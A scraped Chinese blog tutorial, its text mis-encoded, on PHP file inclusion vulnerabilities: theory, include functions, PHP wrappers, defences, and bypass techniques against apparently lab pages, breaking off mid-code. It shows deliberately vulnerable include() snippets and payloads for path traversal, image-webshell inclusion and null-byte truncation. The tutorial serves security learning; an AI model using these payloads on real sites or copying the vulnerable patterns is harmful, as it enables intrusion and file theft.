{"blogid": "124575521", "writerAge": "ç é¾„3å¹´", "writerBlogNum": "19", "writerCollect": "554", "writerComment": "512", "writerFan": "855", "writerGrade": "4çº§", "writerIntegral": "1585", "writerName": "èŠ±åŸçš„åŒ…åŒ…", "writerProfileAdress": "writer_image\\profile_124575521.jpg", "writerRankTotal": "24946", "writerRankWeekly": "18752", "writerThumb": "451", "writerVisitNum": "42964", "blog_read_count": "2180", "blog_time": "å·²äºÂ 2022-06-08 00:17:27Â ä¿®æ”¹", "blog_title": "æ–‡ä»¶åŒ…å«æ¼æ´", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-tomorrow-night\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>ç›®å½•</h3>\n<ul><li><a href=\"#_1\">ğŸŒ»ä¸€ã€ç†è®º</a></li><li><ul><li><a href=\"#1_2\">ğŸ1.ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Ÿ</a></li><li><a href=\"#2_4\">ğŸ2.æ–‡ä»¶åŒ…å«æ¼æ´åŸå› </a></li><li><a href=\"#3_7\">ğŸ3.æ–‡ä»¶åŒ…å«å‡½æ•°</a></li><li><a href=\"#4_17\">ğŸ4.æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ†ç±»</a></li><li><ul><li><a href=\"#_41LFI_18\">ğŸ¥‘ 4.1æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰</a></li><li><a href=\"#42RFI_32\">ğŸ¥‘4.2è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼‰</a></li></ul>\n</li><li><a href=\"#5php_37\">ğŸ5.phpä¼ªåè®®</a></li><li><a href=\"#6_47\">ğŸ6.æ–‡ä»¶åŒ…å«æ¼æ´å¦‚ä½•é˜²å¾¡ï¼Ÿ</a></li></ul>\n</li><li><a href=\"#_56\">ğŸŒ»äºŒã€ç»•è¿‡æ–¹å¼</a></li><li><ul><li><a href=\"#1_57\">ğŸ1ã€ç»“åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ç»•è¿‡</a></li><li><a href=\"#200_80\">ğŸ2ã€00æˆªæ–­ç»•è¿‡</a></li><li><a href=\"#3_99\">ğŸ3ã€ç‚¹åŠ æ–œæ ç»•è¿‡</a></li><li><a href=\"#4_128\">ğŸ4ã€å»æ‰åç¼€åç»•è¿‡</a></li><li><a href=\"#5_158\">ğŸ5ã€åŒå†™ç‚¹ç‚¹æ ç»•è¿‡</a></li><li><a href=\"#6methodPOST_186\">ğŸ6ã€methodä¸ºPOST</a></li><li><a href=\"#7_215\">ğŸ7ã€åŒ…å«æ—¥å¿—æ–‡ä»¶</a></li></ul>\n</li><li><a href=\"#_216\">ğŸŒ»ä¸‰ã€å¾…è¡¥å……</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"_1\"></a>ğŸŒ»ä¸€ã€ç†è®º</h1>\n<h2><a id=\"1_2\"></a>ğŸ1.ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Ÿ</h2>\n<p>é€šè¿‡<code>PHPå‡½æ•°å¼•å…¥æ–‡ä»¶</code>æ—¶ï¼Œä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡<code>åˆç†çš„éªŒè¯</code>ï¼Œä»è€Œæ“ä½œäº†<code>é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶</code>ï¼Œå°±å¯èƒ½å¯¼è‡´æ„å¤–çš„<code>æ–‡ä»¶æ³„æ¼</code>ç”šè‡³æ¶æ„<code>ä»£ç æ³¨å…¥</code>ã€‚</p>\n<h2><a id=\"2_4\"></a>ğŸ2.æ–‡ä»¶åŒ…å«æ¼æ´åŸå› </h2>\n<p>ä¸ºäº†ä»£ç æ›´çµæ´»ï¼Œé€šå¸¸ä¼šæŠŠè¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸º<code>å˜é‡ </code>ï¼Œè¿›è¡Œ<code>åŠ¨æ€è°ƒç”¨</code> ï¼Œä»è€Œå¯¼è‡´<code>å®¢æˆ·ç«¯å¯ä»¥è°ƒç”¨ä»»æ„æ–‡ä»¶</code> ï¼Œé€ æˆ<code>æ–‡ä»¶åŒ…å«æ¼æ´</code>ã€‚åŠ¨æ€åŒ…å«çš„æ–‡ä»¶<code>è·¯å¾„å‚æ•°ï¼Œå®¢æˆ·ç«¯å¯æ§ </code>ã€‚<code>webåº”ç”¨å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ–è€…ä¸¥æ ¼è¿‡æ»¤å°±å¸¦å…¥æ–‡ä»¶åŒ…å«å‡½æ•°ä¸­æ‰§è¡Œ</code></p>\n<h2><a id=\"3_7\"></a>ğŸ3.æ–‡ä»¶åŒ…å«å‡½æ•°</h2>\n<table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>include()</td><td>æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶åªäº§ç”Ÿè­¦å‘Š ï¼Œè„šæœ¬å°†ç»§ç»­æ‰§è¡Œ</td></tr><tr><td>include_once()</td><td>æ­¤è¯­å¥å’Œ include() è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«</td></tr><tr><td>require()</td><td>æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬</td></tr><tr><td>require_once()</td><td>æ­¤è¯­å¥å’Œ require()è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«</td></tr></tbody></table>\n<p>å…¶å®ƒç”¨äºåŒ…å«çš„å‡½æ•°ï¼š<code>highlightfile()ã€ showsource()ã€ readfile()ã€ filegetcontents()ã€ fopen()ã€file()</code></p>\n<h2><a id=\"4_17\"></a>ğŸ4.æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ†ç±»</h2>\n<h3><a id=\"_41LFI_18\"></a>ğŸ¥‘ 4.1æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰</h3>\n<p>æŒ‡é€šè¿‡ç›¸å¯¹è·¯å¾„/ç»å¯¹è·¯å¾„ çš„æ–¹å¼èƒ½æ‰“å¼€å¹¶åŒ…å« æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œå¤§éƒ¨åˆ†æƒ…å†µé‡åˆ°çš„æ–‡ä»¶åŒ…å«æ¼æ´éƒ½æ˜¯ LFIç”¨æˆ·å¯ä»¥ åŠ¨æ€æ§åˆ¶å˜é‡ã€‚</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>  <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>è·å–ç³»ç»Ÿä¸­çš„å…¶ä»–æ–‡ä»¶å†…å®¹ç»å¯¹è·¯å¾„ è¯»å–æœ¬åœ° host æ–‡ä»¶<br/> <code>payloadï¼š?filename=C:\\Windows\\System32\\drivers\\etc\\hosts</code><br/> ç›¸å¯¹è·¯å¾„ è¯»å–æœ¬åœ° host æ–‡ä»¶<br/> <code>payloadï¼š?filename=..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts</code><br/> åŒ…å«å›¾ç‰‡é©¬<br/> <code>payloadï¼š?filename=./test.jpg</code></p>\n<h3><a id=\"42RFI_32\"></a>ğŸ¥‘4.2è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼‰</h3>\n<p>æŒ‡çš„æ˜¯èƒ½å¤ŸåŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡ http(s)æˆ–è€… ftp ç­‰æ–¹å¼ï¼Œè¿œç¨‹åŠ è½½æ–‡ä»¶<br/> æ¡ä»¶<br/> allow_url_include = On ï¼ˆé»˜è®¤ä¸º OFFï¼Œéœ€è¦åœ¨ php.ini ä¸­æ‰‹åŠ¨æ‰“å¼€ï¼‰allow_url_fopen = On ï¼ˆæ˜¯å¦å…è®¸æ‰“å¼€è¿œç¨‹æ–‡ä»¶ï¼‰ç”¨æˆ·å¯ä»¥åŠ¨æ€æ§åˆ¶å˜é‡</p>\n<h2><a id=\"5php_37\"></a>ğŸ5.phpä¼ªåè®®</h2>\n<table><thead><tr><th>åè®®</th><th>phpç‰ˆæœ¬</th><th>allow_url_fopen</th><th>aloow_url_include</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>file://</td><td>&gt;=5.2</td><td>off/on</td><td>off/on</td><td>è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</td></tr><tr><td>php://input</td><td>&gt;=5.2</td><td>off/on</td><td>off/on</td><td>è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ</td></tr><tr><td>zlib://</td><td>&gt;=5.2</td><td>off/on</td><td>off/on</td><td>å‹ç¼©æµ</td></tr><tr><td>data://</td><td>&gt;=5.2</td><td>on</td><td>on</td><td>æ•°æ®ï¼ˆRFC2397ï¼‰</td></tr><tr><td>php://filter</td><td>/</td><td>/</td><td>/</td><td>php://filter/read=convert.base64-encode/resource=flag.php:æ˜¯phpä¸­ç‹¬æœ‰çš„ä¸€ç§åè®®ï¼Œæ˜¯ä¸€ç§è¿‡æ»¤å™¨ï¼Œå¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥è¿‡æ»¤å…¶ä»–çš„æ•°æ®æµã€‚é€šå¸¸ä½¿ç”¨è¯¥åè®®æ¥è¯»å–æˆ–è€…å†™å…¥éƒ¨åˆ†æ•°æ®ï¼Œä¸”åœ¨è¯»å–å’Œå†™å…¥ä¹‹å‰å¯¹æ•°æ®è¿›è¡Œä¸€äº›è¿‡æ»¤</td></tr></tbody></table>\n<p>ï¼ˆå¾…è¡¥å……â€¦ï¼‰</p>\n<h2><a id=\"6_47\"></a>ğŸ6.æ–‡ä»¶åŒ…å«æ¼æ´å¦‚ä½•é˜²å¾¡ï¼Ÿ</h2>\n<ul><li>phpä¸­ä½¿ç”¨open_basediré…ç½®é™åˆ¶è®¿é—®åœ¨æŒ‡å®šçš„åŒºåŸŸè¿‡æ»¤ï¼›</li><li>è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦å¦‚<code>ï¼ˆç‚¹)/(æ­£æ–œæ )\\(åæ–œæ )</code>;</li><li>ç¦æ­¢æœåŠ¡å™¨è¿œç¨‹æ–‡ä»¶åŒ…å«;</li><li>å°½é‡ä¸è¦ä½¿ç”¨åŠ¨æ€åŒ…å«ï¼Œå¯ä»¥åœ¨éœ€è¦åŒ…å«çš„é¡µé¢å›ºå®šå†™å¥½.</li><li>é…ç½®php.inié…ç½®æ–‡ä»¶</li><li>è®¾ç½®é»‘ç™½åå•</li></ul>\n<h1><a id=\"_56\"></a>ğŸŒ»äºŒã€ç»•è¿‡æ–¹å¼</h1>\n<h2><a id=\"1_57\"></a>ğŸ1ã€ç»“åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ç»•è¿‡</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>     <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../common/header.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from https<span class=\"token punctuation\">:</span><span class=\"token comment\">//pentesterlab.com/exercises/php_include_and_post_exploitation/course --&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the GET parameter \\\"page\\\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-1/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"GET\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"page\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"page\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>è¿™ç§æƒ…å†µç›´æ¥åŒ…å«ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶å°±ä¼šè¢«å½“åšphpæ–‡ä»¶æ‰§è¡Œ<br/> åˆ©ç”¨ç»å¯¹è·¯å¾„å»è¯»cç›˜ä¸‹çš„æ•æ„Ÿä¿¡æ¯ï¼š<br/> <code>?page=c://boot.ini</code><br/> ç»“åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´æ‰“ä¸€å¥—ç»„åˆæ‹³<br/> æ€è·¯ï¼šä¾‹å¦‚ï¼Œä½ è¿›å…¥äº†æŸç½‘ç«™çš„åå°ï¼Œåœ¨ä¿®æ”¹å¤´åƒå¤„å¯ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯å›¾ç‰‡ä¸Šä¼ é™åˆ¶äº†åç¼€åjpg/pngï¼Œé‚£ä½ å°±å¯ä»¥ä¸Šä¼ ä¸€å¼ jpgæˆ–è€…pngçš„å›¾ç‰‡é©¬ï¼Œå³åœ¨å›¾ç‰‡ä¸­å†™å…¥phpæœ¨é©¬ï¼Œç„¶åä¸Šä¼ ï¼Œç•™æ„ä¸€ä¸‹ä¸Šä¼ çš„å›¾ç‰‡ä½ç½®ï¼Œå¦‚æœè¯¥ç«™è¿˜å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé‚£ä¹ˆä½ å°±å¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«åˆšåˆšä½ ä¸Šä¼ çš„å›¾ç‰‡é©¬è·å–websehllã€‚<br/> <code>?page=../../../../webshell.jpg</code><br/> å’ŒåŒ…å«çš„æ–‡ä»¶ç±»å‹æ²¡æœ‰å…³ç³»ï¼Œéƒ½ä¼šè¢«å½“åšphpè§£æã€‚</p>\n<h2><a id=\"200_80\"></a>ğŸ2ã€00æˆªæ–­ç»•è¿‡</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>     <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../common/header.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from http<span class=\"token punctuation\">:</span><span class=\"token comment\">//www.ush.it/2009/02/08/php-filesystem-attack-vectors/ --&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the GET parameter \\\"library\\\", appends .php to end, escape with NULL byte %00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-2/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"GET\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"library\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"includes/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'library'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>è¿™ç§æƒ…å†µï¼Œå¦‚æœä½ åŒ…å«ä¸€ä¸ª<code>?library=../../../../webshell.php</code>åå°å¾—åˆ°çš„æ˜¯<code>?library=../../../../webshell.php.php</code>,æ˜¾ç„¶è¿™æ ·å¹¶ä¸èƒ½è¢«è§£æã€‚<br/> è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç”¨%00æˆªæ–­<code>?library=../../../../webshell.php%00</code>åå°å¾—åˆ°çš„æ˜¯è¿™æ ·çš„<code>?library=../../../../webshell.php .php</code>åé¢é‚£ä¸ª.phpå°±ä¼šè¢«å¿½ç•¥æ‰äº†ã€‚</p>\n<h2><a id=\"3_99\"></a>ğŸ3ã€ç‚¹åŠ æ–œæ ç»•è¿‡</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>     <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../common/header.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from http<span class=\"token punctuation\">:</span><span class=\"token comment\">//www.ush.it/2009/02/08/php-filesystem-attack-vectors/ --&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the GET parameter \\\"file\\\", looks for .php at end - bypass by apending /. (slash plus dot)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-3/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"GET\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span>\n <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">else</span>\n <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You are not allowed to see source files!'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>è¯»æºç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå®ƒå¤šäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå³<code>if (substr($_GET['file'], -4, 4) != '.php')</code>è¿™å¥ä»£ç çš„æ„æ€æ˜¯ï¼Œå–æ–‡ä»¶çš„åå››ä½ï¼Œå¦‚æœä¸æ˜¯<code>.php</code>ç»“å°¾çš„å°±å»è¯»å–å†…å®¹ï¼Œå¦åˆ™è¾“å‡º<code>You are not allowed to see source files!</code><br/> ç»•è¿‡æ€è·¯ï¼šæˆ‘ä»¬å¯ä»¥åœ¨æ–‡ä»¶ååé¢åŠ ä¸€ä¸ªç‚¹ã€æ–œæ æˆ–è€…%00ç»•è¿‡<br/> <code>?file=../../../../webshell.php.</code><br/> <code>?file=../../../../webshell.php/.</code><br/> <code>?file=../../../../webshell.php%00</code><br/> æ³¨æ„ï¼šæµè§ˆå™¨å¯èƒ½ä¼šè¿‡æ»¤æ‰ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>BP</code>æŠ“åŒ…ä¿®æ”¹ã€‚<br/> windowsæ–‡ä»¶åä¸å…è®¸åŒ…å«è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚æœä½ åˆ›å»ºä¸€ä¸ª<code>test.php.</code>å¾—åˆ°çš„æ˜¯ä¸€ä¸ª<code>test.php</code>åé¢å“ªä¸ªç‚¹ä¼šè‡ªåŠ¨æŠ¹æ‰ã€‚<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\180352396c0a4098b4c07a40495cc056.png\"/></p>\n<h2><a id=\"4_128\"></a>ğŸ4ã€å»æ‰åç¼€åç»•è¿‡</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>     <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../common/header.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from http<span class=\"token punctuation\">:</span><span class=\"token comment\">//www.ush.it/2009/02/08/php-filesystem-attack-vectors/ --&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the GET parameter \\\"class\\\", appends .php to end, defeat with NULL byte %00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-4/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"GET\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"class\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'includes/class_'</span><span class=\"token operator\">.</span><span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>è¿™é‡Œå…³é”®åœ¨äº<code>addslashes</code>è¿™ä¸ªå‡½æ•°<br/> å®šä¹‰å’Œç”¨æ³•<br/> addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚<br/> é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š</p>\n<pre><code>å•å¼•å·ï¼ˆ'ï¼‰\nåŒå¼•å·ï¼ˆ\"ï¼‰\nåæ–œæ ï¼ˆ\\ï¼‰\nNULL\n</code></pre>\n<p>æ„æ€å°±æ˜¯å°†è¿™äº›å±é™©å­—ç¬¦å‰é¢åŠ åæ–œæ <code>\\</code>è½¬ä¹‰æ‰ï¼Œæ˜¯ä¸€ç§é¢„é˜²æ”»å‡»çš„æ–¹æ³•ã€‚<br/> æ–‡ä»¶åŒ…å«çš„æ—¶å€™å»æ‰åç¼€<code>.php</code>å³å¯<br/> <code> ?class=../../../../phpinfo</code></p>\n<h2><a id=\"5_158\"></a>ğŸ5ã€åŒå†™ç‚¹ç‚¹æ ç»•è¿‡</h2>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from http<span class=\"token punctuation\">:</span><span class=\"token comment\">//hakipedia.com/index.php/Local_File_Inclusion --&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php     <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../common/header.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the GET parameter \\\"file\\\", strips prepended \\\"../\\\" strings, must encode / with %2f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-5/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"GET\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name type-declaration\">php</span>\n   <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n   <span class=\"token punctuation\">{<!-- --></span>\n       <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string 